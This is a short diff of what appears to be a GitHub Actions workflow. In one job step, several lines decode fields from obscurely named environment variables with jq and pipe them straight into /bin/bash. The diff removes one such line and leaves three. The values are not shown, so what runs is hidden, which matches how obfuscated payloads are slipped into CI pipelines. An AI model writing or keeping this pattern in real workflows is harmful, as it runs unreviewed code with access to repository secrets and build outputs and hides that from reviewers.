@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$gem53" | jq -r .zchng2 | /bin/bash
           echo $w7584 | jq -r .oc15 | /bin/bash
-          printf '%s' "$ikvl8575" | jq -r .diul0 | /bin/bash
           echo $wu3 | jq -r .aj9 | /bin/bash
 
       - name: Upload results
